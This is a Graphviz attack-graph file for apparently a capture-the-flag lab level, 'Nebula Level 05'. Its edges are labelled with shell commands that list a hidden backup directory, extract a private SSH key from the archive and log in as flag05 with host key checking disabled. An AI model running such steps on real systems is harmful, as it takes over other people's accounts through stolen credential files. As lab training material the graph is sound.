digraph AttackGraph {
  rankdir=LR;
  graph [fontsize=12, labelloc="t", label="Attack Graph (reference) - Nebula Level 05"];
  node [shape=box, style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica"];
  edge [color="#555555", fontname="Helvetica", fontsize=10];

  start [shape="box", style="rounded,filled", fillcolor="#EAF3FF", color="#444444", fontname="Helvetica", label="Start"];
  node0 [shape="box", style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica", label="Backup archive identified"];
  node1 [shape="box", style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica", label="SSH key extracted"];
  node2 [shape="box", style="rounded,filled", fillcolor="#E8FFE8", color="#2E7D32", fontname="Helvetica", penwidth="2", label="Execution as flag05 obtained"];

  start -> node0 [color="#555555", fontname="Helvetica", fontsize="10", label="ls -al /home/flag05/.backup"];
  node0 -> node1 [color="#555555", fontname="Helvetica", fontsize="10", label="tar xzf /home/flag05/.backup/backup-19072011.tgz -C /tmp"];
  node1 -> node2 [color="#555555", fontname="Helvetica", fontsize="10", label="ssh -i /tmp/.ssh/id_rsa -o StrictHostKeyChecking=no flag05@localhost"];
}
